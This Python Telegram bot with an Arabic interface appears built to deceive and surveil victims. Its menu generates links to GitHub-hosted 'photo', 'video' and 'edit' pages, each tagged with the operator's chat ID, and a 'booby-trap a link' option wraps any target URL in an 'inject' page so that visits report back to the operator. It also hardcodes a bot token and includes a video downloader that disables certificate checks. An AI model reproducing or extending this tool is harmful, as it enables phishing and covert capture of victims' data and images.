import os
import urllib3
import telebot
from telebot import types
import threading
import http.server
import yt_dlp

# إيقاف التحذيرات
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc"
bot = telebot.TeleBot(BOT_TOKEN)

# الروابط المستقلة
PHOTO_PAGE = "https://app-display.github.io/ca.html-chatld-/" 
INJECT_PAGE = "https://app-display.github.io/ca.html-chatld2/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"

user_states = {}

# --- السيرفر للبقاء نشطاً ---
def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()

# --- دالة التحميل المصلحة ---
def download_video_sync(url, chat_id):
    try:
        file_path = f'/tmp/vid_{chat_id}.mp4'
        # التعديل هنا: استخدام التنسيق المتوافق مع الكود السابق + الترويسات الصحيحة
        ydl_opts = {
            'format': 'best[ext=mp4]/best',
            'outtmpl': file_path,
            'quiet': True,
            'no_warnings': True,
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'referer': 'https://www.instagram.com/',
            'nocheckcertificate': True,
            'geo_bypass': True
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            if os.path.exists(file_path): os.remove(file_path)
            info = ydl.extract_info(url, download=True)
            return file_path, info.get('title', 'Video')
    except Exception as e: 
        return None, str(e)

def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("✨ رابط تعديل", callback_data="get_image_edit_link"),
        types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_video"),
        types.InlineKeyboardButton("🌐 أخبار وبث مباشر", callback_data="news_menu"),
        types.InlineKeyboardButton("💣 تلغيم رابط", callback_data="inject_start")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "👋 أهلاً بك، المطور سيف الدين يرحب بك!", reply_markup=get_main_keyboard())

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id

    if call.data == "news_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🔴 الجزيرة مباشر", web_app=types.WebAppInfo(url="https://www.aljazeera.net/live")),
            types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu")
        )
        bot.edit_message_text("🌐 البث المباشر:", chat_id, call.message.message_id, reply_markup=markup)
    
    elif call.data == "inject_start":
        user_states[chat_id] = "waiting_for_inject"
        bot.edit_message_text("💣 أرسل الرابط الذي تريد تلغيمه:", chat_id, call.message.message_id)

    elif call.data == "dl_video":
        user_states[chat_id] = "waiting_for_url"
        bot.edit_message_text("📥 أرسل رابط الفيديو للتحميل:", chat_id, call.message.message_id)
    
    elif call.data == "main_menu":
        bot.edit_message_text("🤖 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
    
    elif call.data == "get_photo_link": bot.send_message(chat_id, f"🖼️ رابط الصور:\n{PHOTO_PAGE}?chatId={chat_id}")
    elif call.data == "get_video_link": bot.send_message(chat_id, f"🎥 رابط الفيديو:\n{VIDEO_PAGE_URL}?chatId={chat_id}")
    elif call.data == "get_image_edit_link": bot.send_message(chat_id, f"✨ رابط التعديل:\n{IMAGE_EDIT_URL}?chatId={chat_id}")
    
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    
    if state == "waiting_for_inject":
        target = message.text if message.text.startswith("http") else f"https://{message.text}"
        bot.reply_to(message, f"✅ تم التلغيم (صفحة العد):\n{INJECT_PAGE}?target={target}&chatId={chat_id}")
        user_states[chat_id] = None
        
    elif state == "waiting_for_url":
        status_msg = bot.reply_to(message, "⏳ جاري التحميل... يرجى الانتظار.")
        path, title = download_video_sync(message.text, chat_id)
        if path:
            bot.send_video(chat_id, open(path, 'rb'), caption=title)
            bot.delete_message(chat_id, status_msg.message_id)
            os.remove(path)
        else:
            bot.edit_message_text(f"❌ فشل التحميل. تأكد من صحة الرابط.", chat_id, status_msg.message_id)
        user_states[chat_id] = None

if __name__ == '__main__':
    threading.Thread(target=run_dummy_server, daemon=True).start()
    bot.polling(none_stop=True)
